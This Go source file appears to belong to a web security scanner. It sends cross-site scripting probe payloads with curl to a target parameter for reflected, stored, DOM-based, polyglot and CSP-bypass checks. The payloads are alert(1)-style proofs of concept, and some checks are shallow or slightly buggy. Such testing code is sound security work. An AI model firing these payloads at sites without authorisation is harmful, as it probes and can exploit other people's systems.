package websecurity

import (
	"fmt"
	"net/url"
	"strings"
)

func XSSReflected(target, param, payload string) (string, error) {
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmd := throttledExec("curl", "-s", fullURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("reflected XSS test failed: %w: %s", err, string(out))
	}
	detected := strings.Contains(string(out), payload)
	return fmt.Sprintf("Reflected XSS test on %s via %s: payload=%s detected=%v response_len=%d", target, param, payload, detected, len(out)), nil
}

func XSSStored(target, formData, payload string) (string, error) {
	body := strings.ReplaceAll(formData, "XSS_PAYLOAD", url.QueryEscape(payload))
	cmd := throttledExec("curl", "-s", "-X", "POST", "-d", body, target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("stored XSS test failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("Stored XSS test on %s with payload=%s completed: %s", target, payload, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func XSSDOMBased(target string) (string, error) {
	payloads := []string{
		"<script>document.write('test')</script>",
		"#<img src=x onerror=alert(1)>",
		"javascript:alert(1)",
	}
	var results []string
	for _, p := range payloads {
		fullURL := fmt.Sprintf("%s?q=%s", strings.TrimRight(target, "?"), url.QueryEscape(p))
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("%s: %d", p, len(out)))
	}
	return fmt.Sprintf("DOM-based XSS detection on %s completed with %d payloads: %s", target, len(payloads), strings.Join(results, " | ")), nil
}

func XSSPolyglot(target, param string) (string, error) {
	payload := `"';><marquee onerror=alert(1)>`
	fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(payload))
	cmd := throttledExec("curl", "-s", fullURL)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("XSS polyglot test failed: %w: %s", err, string(out))
	}
	detected := strings.Contains(string(out), "marquee") || strings.Contains(string(out), "alert")
	return fmt.Sprintf("XSS polyglot test on %s via %s: detected=%v response_len=%d", target, param, detected, len(out)), nil
}

func XSSCSPBypass(target, param string) (string, error) {
	payloads := []string{
		"<script src='https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js'></script>",
		"<iframe srcdoc='<script>alert(1)</script>'></iframe>",
		"<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
	}
	var results []string
	for _, p := range payloads {
		fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(p))
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("payload_%d: %d", len(results)+1, len(out)))
	}
	return fmt.Sprintf("CSP bypass XSS test on %s via %s completed with %d payloads: %s", target, param, len(payloads), strings.Join(results, " | ")), nil
}

func XSSDetect(target, param string) (string, error) {
	signals := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
	}
	var results []string
	for _, s := range signals {
		fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(s))
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		reflected := strings.Contains(string(out), s)
		results = append(results, fmt.Sprintf("%s: reflected=%v", s[:20], reflected))
	}
	return fmt.Sprintf("XSS detection on %s via %s: %s", target, param, strings.Join(results, " | ")), nil
}
